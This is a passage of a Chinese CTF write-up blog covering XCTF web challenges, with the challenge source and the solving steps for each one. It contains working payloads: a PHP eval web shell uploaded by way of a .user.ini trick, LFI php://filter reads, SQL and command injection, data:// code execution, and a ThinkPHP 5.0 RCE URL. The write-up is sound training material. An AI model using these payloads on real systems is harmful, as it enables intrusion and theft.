src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308170944313.png"></p><h2 id="3-easyphp-NO-GFSJ1059"><a href="#3-easyphp-NO-GFSJ1059" class="headerlink" title="3.easyphp-NO.GFSJ1059"></a>3.easyphp-NO.GFSJ1059</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$key1</span> = <span class="number">0</span>;</span><br><span class="line"><span class="variable">$key2</span> = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">#a的值大于6000000并且a的长度小于等于3</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$a</span>) &amp;&amp; <span class="title function_ invoke__">intval</span>(<span class="variable">$a</span>) &gt; <span class="number">6000000</span> &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$a</span>) &lt;= <span class="number">3</span>)&#123;</span><br><span class="line"><span class="comment">#b需要满足md5的值的截取部分等于8b184b</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$b</span>) &amp;&amp; <span class="string">&#x27;8b184b&#x27;</span> === <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>),-<span class="number">6</span>,<span class="number">6</span>))&#123;</span><br><span class="line">        <span class="variable">$key1</span> = <span class="number">1</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Emmm...再想想&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Emmm...&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#c是传入的一个json数组</span></span><br><span class="line"><span class="variable">$c</span>=(<span class="keyword">array</span>)<span class="title function_ invoke__">json_decode</span>(@<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]);</span><br><span class="line"><span class="comment">#c的m不是数字且其值大于2022</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$c</span>) &amp;&amp; !<span class="title function_ invoke__">is_numeric</span>(@<span class="variable">$c</span>[<span class="string">&quot;m&quot;</span>]) &amp;&amp; <span class="variable">$c</span>[<span class="string">&quot;m&quot;</span>] &gt; <span class="number">2022</span>)&#123;</span><br><span class="line"><span class="comment">#c的n也是一个数组,有两个元素,c的n的第一个元素也是一个数组</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(@<span class="variable">$c</span>[<span class="string">&quot;n&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">count</span>(<span class="variable">$c</span>[<span class="string">&quot;n&quot;</span>]) == <span class="number">2</span> &amp;&amp; <span class="title function_ invoke__">is_array</span>(<span class="variable">$c</span>[<span class="string">&quot;n&quot;</span>][<span class="number">0</span>]))&#123;</span><br><span class="line">    <span class="comment">#$d不能是false所以能在c的n数组中找到DGGJ</span></span><br><span class="line">        <span class="variable">$d</span> = <span class="title function_ invoke__">array_search</span>(<span class="string">&quot;DGGJ&quot;</span>, <span class="variable">$c</span>[<span class="string">&quot;n&quot;</span>]);</span><br><span class="line">        <span class="variable">$d</span> === <span class="literal">false</span>?<span class="keyword">die</span>(<span class="string">&quot;no...&quot;</span>):<span class="literal">NULL</span>;</span><br><span class="line">        <span class="comment">#n中值不能为DGGJ</span></span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$c</span>[<span class="string">&quot;n&quot;</span>] <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$val</span>)&#123;</span><br><span class="line">            <span class="variable">$val</span>===<span class="string">&quot;DGGJ&quot;</span>?<span class="keyword">die</span>(<span class="string">&quot;no......&quot;</span>):<span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$key2</span> = <span class="number">1</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no hack&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;no&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$key1</span> &amp;&amp; <span class="variable">$key2</span>)&#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;Hgfks.php&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;You&#x27;re right&quot;</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> Emmm...</span><br></pre></td></tr></table></figure><p>a<br>用1e9即可绕过</p><p>b<br>编写脚本爆破</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$i</span> = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">while</span> (<span class="variable">$i</span> &lt; <span class="number">100000</span>)&#123;</span><br><span class="line">    <span class="variable">$a</span> = (<span class="keyword">string</span>)<span class="variable">$i</span>;</span><br><span class="line">    <span class="variable">$b</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">substr</span>(<span class="variable">$b</span>,-<span class="number">6</span>,<span class="number">6</span>) == <span class="string">&#x27;8b184b&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$b</span>.<span class="string">&#x27;&lt;br /&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$a</span>.<span class="string">&#x27;&lt;br /&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$i</span> = <span class="variable">$i</span>+<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$md</span> = <span class="string">&quot;end&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$md</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308170945323.png"><br>爆破出b为53724</p><p>C<br>1.m<br>字符串与整形比大小会将字符串强行转为整形<br>114514a &#x3D;》 114514 &gt; 2022<br>2.n<br>题目内既要求有DGGJ又要求没有DGGJ,所以需要绕过<br>array_search函数是可以绕过的,在与数字进行匹配，字符串会被强制转换为数字，DGGJ会被转换为0,所以n的第二个元素为整数0<br>第一个元素没有要求只要是数组随便写</p><p>所以C &#x3D; {m:”114514a”;n:[[1],0]}<br>综上</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://61.147.171.105:54204/?a=1e9&amp;b=53724&amp;c=&#123;%22m%22:%22114514a%22,%22n%22:[[1],0]&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308170945243.png"></p><h2 id="4-fileinclude-NO-GFSJ1010"><a href="#4-fileinclude-NO-GFSJ1010" class="headerlink" title="4.fileinclude-NO.GFSJ1010"></a>4.fileinclude-NO.GFSJ1010</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;file1&quot;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;file2&quot;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$file1</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file1&quot;</span>];</span><br><span class="line">    <span class="variable">$file2</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file2&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$file1</span>) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$file2</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file2</span>) === <span class="string">&quot;hello ctf&quot;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">include</span>(<span class="variable">$file1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;NONONO&quot;</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>需要传入被包含的file1,file1&#x3D;flag.php<br>需要传入file2, file_get_contents($file2)值等于hello ctf<br>则想到用php:&#x2F;&#x2F;input,post的值为hello ctf<br>返回<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308170946155.png"></p><p>尝试file1使用伪协议读取flag,成功返回结果<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308170947654.png"></p><p>解密后得到key<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308170948584.png"></p><h2 id="5-easyupload-NO-GFSJ1005"><a href="#5-easyupload-NO-GFSJ1005" class="headerlink" title="5.easyupload-NO.GFSJ1005"></a>5.easyupload-NO.GFSJ1005</h2><p>尝试上传了一张图片,发现返回图片地址,可直接访问<br>尝试上传木马,抓包多次排查发现过滤了php,php1-9,.htaccess</p><p>后端验证,尝试使用user.ini文件<br>.user.ini是php.ini补充文件,当网页访问时会自动查看当前目录下是否有user.ini, 将其补充进php.ini<br>很多功能只能php.ini设置,但是有些危险功能也能通过user.ini配置</p><p>auto_prepend_file 用于指定一个每个php脚本执行前自动包含的文件<br>我们可以先传入.user.ini文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">auto_prepend_file=test.jpg</span><br></pre></td></tr></table></figure><p>抓包上传发现上传失败,尝试改Content-Type和文件头<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308170949744.png"></p><p>发现上传成功<br>新建test.jpg</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">GIF89a</span><br><span class="line"><span class="meta">&lt;?=</span><span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pass&#x27;</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>F12查看文件上传路径</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://61.147.171.105:54702/uploads/index.php</span><br></pre></td></tr></table></figure><p>蚁剑连接,在目录下拿到key</p><p>.user.ini应用比.htaccess更广,只要以fastcgi运行的php都可以</p><h2 id="6-fileinclude-NO-GFSJ1007"><a href="#6-fileinclude-NO-GFSJ1007" class="headerlink" title="6.fileinclude-NO.GFSJ1007"></a>6.fileinclude-NO.GFSJ1007</h2><p>ctrl+U得到源码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>( !<span class="title function_ invoke__">ini_get</span>(<span class="string">&#x27;display_errors&#x27;</span>) ) &#123;</span><br><span class="line">  <span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_errors&#x27;</span>, <span class="string">&#x27;On&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(E_ALL);</span><br><span class="line"><span class="variable">$lan</span> = <span class="variable">$_COOKIE</span>[<span class="string">&#x27;language&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$lan</span>)</span><br><span class="line">&#123;</span><br><span class="line">@<span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;language&quot;</span>,<span class="string">&quot;english&quot;</span>);</span><br><span class="line">@<span class="keyword">include</span>(<span class="string">&quot;english.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">@<span class="keyword">include</span>(<span class="variable">$lan</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$x</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$x</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>需要传入其中language参数用于构造被包含文件<br>尝试language&#x3D;flag发现无回显<br>尝试使用伪协议</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Cookie: language=php://filter/read=convert.base64-encode/resource=flag</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308170950429.png"><br>得到base64编码字符串<br>解码后得到flag</p><h2 id="7-inget-NO-GFSJ1004"><a href="#7-inget-NO-GFSJ1004" class="headerlink" title="7.inget-NO.GFSJ1004"></a>7.inget-NO.GFSJ1004</h2><p>输入参数id尝试登录,<br>猜测为单引号闭和,构造?id&#x3D;1’ or ‘1’&#x3D;’1<br>使语句为真成功绕过得到flag</p><h2 id="8-unserialize3-NO-GFSJ0235"><a href="#8-unserialize3-NO-GFSJ0235" class="headerlink" title="8.unserialize3-NO.GFSJ0235"></a>8.unserialize3-NO.GFSJ0235</h2><p>根据题意生成对应序列化字符串</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xctf</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$flag</span> = <span class="string">&#x27;111&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&#x27;bad requests&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">xctf</span>();</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>再讲变量数＋1绕过__wakeup函数得到flag</p><h2 id="9-ics-06-NO-GFSJ0333"><a href="#9-ics-06-NO-GFSJ0333" class="headerlink" title="9.ics-06-NO.GFSJ0333"></a>9.ics-06-NO.GFSJ0333</h2><p>访问报表中心,抓包爆破<br>发现访问id&#x3D;2333页面时有flag</p><h2 id="10-PHP2-NO-GFSJ0234"><a href="#10-PHP2-NO-GFSJ0234" class="headerlink" title="10.PHP2-NO.GFSJ0234"></a>10.PHP2-NO.GFSJ0234</h2><p>自动访问index.php<br>通过访问index.phps获取源码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="string">&quot;admin&quot;</span>===<span class="variable">$_GET</span>[id]) &#123;</span><br><span class="line">  <span class="keyword">echo</span>(<span class="string">&quot;&lt;p&gt;not allowed!&lt;/p&gt;&quot;</span>);</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_GET</span>[id] = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$_GET</span>[id]);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[id] == <span class="string">&quot;admin&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Access granted!&lt;/p&gt;&quot;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Key: xxxxxxx &lt;/p&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">Can you anthenticate to this website?</span><br></pre></td></tr></table></figure><p>进行url编码即可得到flag</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://61.147.171.105:60123/index.php/?id=%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65</span><br></pre></td></tr></table></figure><h2 id="11-baby-web-NO-GFSJ0712"><a href="#11-baby-web-NO-GFSJ0712" class="headerlink" title="11.baby_web-NO.GFSJ0712"></a>11.baby_web-NO.GFSJ0712</h2><p>f12-&gt;networks查看到请求头中有flag<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308170951289.png"></p><h2 id="12-Training-WWW-Robots-NO-GFSJ0162"><a href="#12-Training-WWW-Robots-NO-GFSJ0162" class="headerlink" title="12.Training-WWW-Robots-NO.GFSJ0162"></a>12.Training-WWW-Robots-NO.GFSJ0162</h2><p>访问robots.txt后访问f10g.php即可获得flag</p><h2 id="13-simple-php-NO-GFSJ0485"><a href="#13-simple-php-NO-GFSJ0485" class="headerlink" title="13.simple_php-NO.GFSJ0485"></a>13.simple_php-NO.GFSJ0485</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;config.php&quot;</span>);</span><br><span class="line"><span class="variable">$a</span>=@<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span>=@<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="comment">#a值为0且and自己总值为真</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$a</span>==<span class="number">0</span> <span class="keyword">and</span> <span class="variable">$a</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#b不是数字</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$b</span>))&#123;</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#b值比1234大</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$b</span>&gt;<span class="number">1234</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>a为字符串0即可<br>字符串和数字比较会发生强制转换<br>b&#x3D;12345aaa即可获取flag</p><h2 id="14-weak-auth-NO-GFSJ0482"><a href="#14-weak-auth-NO-GFSJ0482" class="headerlink" title="14.weak_auth-NO.GFSJ0482"></a>14.weak_auth-NO.GFSJ0482</h2><p>admin 123456登录获取flag</p><h2 id="15-get-post-NO-GFSJ0475"><a href="#15-get-post-NO-GFSJ0475" class="headerlink" title="15.get_post-NO.GFSJ0475"></a>15.get_post-NO.GFSJ0475</h2><p>按照指示传入对应值即可获取flag</p><h2 id="16-disabled-button-NO-GFSJ0479"><a href="#16-disabled-button-NO-GFSJ0479" class="headerlink" title="16.disabled_button-NO.GFSJ0479"></a>16.disabled_button-NO.GFSJ0479</h2><p>f12把disabled&#x3D;”” 删除<br>点击按钮即可获取flag</p><h2 id="17-cookie-NO-GFSJ0478"><a href="#17-cookie-NO-GFSJ0478" class="headerlink" title="17.cookie-NO.GFSJ0478"></a>17.cookie-NO.GFSJ0478</h2><p>抓包发现cookie的值为cookie.php<br>访问后查看返回包即可获得flag</p><h2 id="18-backup-NO-GFSJ0477"><a href="#18-backup-NO-GFSJ0477" class="headerlink" title="18.backup-NO.GFSJ0477"></a>18.backup-NO.GFSJ0477</h2><p>访问index.php.bak下载备份文件,得到flag</p><h2 id="19-robots-NO-GFSJ0476"><a href="#19-robots-NO-GFSJ0476" class="headerlink" title="19.robots-NO.GFSJ0476"></a>19.robots-NO.GFSJ0476</h2><p>直接访问robots.txt发现<br>Disallow: f1ag_1s_h3re.php<br>直接访问得到flag</p><h2 id="20-view-source-NO-GFSJ0474"><a href="#20-view-source-NO-GFSJ0474" class="headerlink" title="20.view_source-NO.GFSJ0474"></a>20.view_source-NO.GFSJ0474</h2><p>ctrl+U查看源码&#x2F; f12查看源码得到flag</p><h1 id="2-难度二"><a href="#2-难度二" class="headerlink" title="2.难度二"></a>2.难度二</h1><h2 id="1-command-execution-NO-GFSJ0484"><a href="#1-command-execution-NO-GFSJ0484" class="headerlink" title="1.command_execution-NO.GFSJ0484"></a>1.command_execution-NO.GFSJ0484</h2><p>ping 127.0.0.1 &amp; pwd 返回&#x2F;var&#x2F;www&#x2F;html<br>&amp;没被过滤,进一步找flag</p><p>ping 127.0.0.1 &amp; find &#x2F; -name flag*<br>发现存在&#x2F;home&#x2F;flags.txt</p><p>直接查看得到flag</p><h2 id="2-xff-referer-NO-GFSJ0481"><a href="#2-xff-referer-NO-GFSJ0481" class="headerlink" title="2.xff_referer-NO.GFSJ0481"></a>2.xff_referer-NO.GFSJ0481</h2><p>ip地址必须为123.123.123.123</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">X-Forwarded-For: 123.123.123.123</span><br></pre></td></tr></table></figure><p>必须来自google</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Referer: https://www.google.com</span><br></pre></td></tr></table></figure><h2 id="3-php-rce-NO-GFSJ0713"><a href="#3-php-rce-NO-GFSJ0713" class="headerlink" title="3.php_rce-NO.GFSJ0713"></a>3.php_rce-NO.GFSJ0713</h2><p>thinkphp-v5.0存在rce漏洞<br>查相关文献复现即可<br>回调函数+system函数执行命令</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://61.147.171.105:58546/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=ls</span><br></pre></td></tr></table></figure><p>查找flag</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://61.147.171.105:58546/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=find%20/%20-name%20flag*</span><br></pre></td></tr></table></figure><p>发现存在&#x2F;flag<br>查看即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://61.147.171.105:58546/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=cat%20/flag</span><br></pre></td></tr></table></figure><h2 id="4-Web-php-include-NO-GFSJ0716"><a href="#4-Web-php-include-NO-GFSJ0716" class="headerlink" title="4.Web_php_include-NO.GFSJ0716"></a>4.Web_php_include-NO.GFSJ0716</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">#get传入hello</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_GET</span>[<span class="string">&#x27;hello&#x27;</span>];</span><br><span class="line"><span class="comment">#get传入page</span></span><br><span class="line"><span class="variable">$page</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line"><span class="comment">#查找page中是否有php://,有的话就返回php://和后面的内容</span></span><br><span class="line"><span class="keyword">while</span> (<span class="title function_ invoke__">strstr</span>(<span class="variable">$page</span>, <span class="string">&quot;php://&quot;</span>)) &#123;</span><br><span class="line"><span class="comment">#将php://替换为空</span></span><br><span class="line">    <span class="variable">$page</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php://&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$page</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#文件包含$page</span></span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$page</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>发现过滤php:&#x2F;&#x2F;<br>尝试用data:&#x2F;&#x2F;流绕过</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://61.147.171.105:49769/?hello=123&amp;page=data://text/plain,%3C?php%20phpinfo()?%3E</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308170952443.png"></p><p>执行ls发现存在fl4gisisish3r3.php</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://61.147.171.105:49769/?hello=123&amp;page=data://text/plain,%3C?php%20eval(system(%27ls%27));%20?%3E</span><br></pre></td></tr></table></figure><p>cat被屏蔽,使用tac成功查看</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://61.147.171.105:49769/?hello=123&amp;page=data://text/plain,%3C?php%20eval(system(%27tac%20fl4gisisish3r3.php%27));%20?%3E</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308170952435.png"></p><h2 id="5-upload1-NO-GFSJ0236"><a href="#5-upload1-NO-GFSJ0236" class="headerlink" title="5.upload1-NO.GFSJ0236"></a>5.upload1-NO.GFSJ0236</h2><p>前端校验,关闭js上传即可,<br>返回的结果是 时间戳+’.’+文件名<br>将文件名改成php</p><p>上传后访问返回链接执行命令,传木马上去却报错<br>syntax error, unexpected end of file in <b>&#x2F;var&#x2F;www&#x2F;html&#x2F;upload&#x2F;1691297398.a.php(1) : eval()’d code</b> on line <b>1</b><br /></p><p>直接传命令文件</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;find / -name flag*&#x27;</span>) <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>返回结果里有&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;tac /var/www/html/flag.php&#x27;</span>) <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>访问结果直接得到flag<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308170953604.png"></p><h2 id="6-warmup-NO-GFSJ0743"><a href="#6-warmup-NO-GFSJ0743" class="headerlink" title="6.warmup-NO.GFSJ0743"></a>6.warmup-NO.GFSJ0743</h2><p>查看源码发现注释里有source.php<br>直接访问,得到源码<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308170953810.png"></p> <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params">&amp;<span class="variable">$page</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">        <span class="comment">#白名单中存在两组键值对</span></span><br><span class="line">            <span class="variable">$whitelist</span> = [<span class="string">&quot;source&quot;</span>=&gt;<span class="string">&quot;source.php&quot;</span>,<span class="string">&quot;hint&quot;</span>=&gt;<span class="string">&quot;hint.php&quot;</span>];</span><br><span class="line">            <span class="comment">#page为不空字符串</span></span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>(<span class="variable">$page</span>) || !<span class="title function_ invoke__">is_string</span>(<span class="variable">$page</span>)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"><span class="comment">#如果page在白名单里返回真</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#截取page,从第一位开始截取到第一个？所在位</span></span><br><span class="line">            <span class="variable">$_page</span> = <span class="title function_ invoke__">mb_substr</span>(</span><br><span class="line">                <span class="variable">$page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="comment">#截取后的结果如果在白名单，返回为真</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            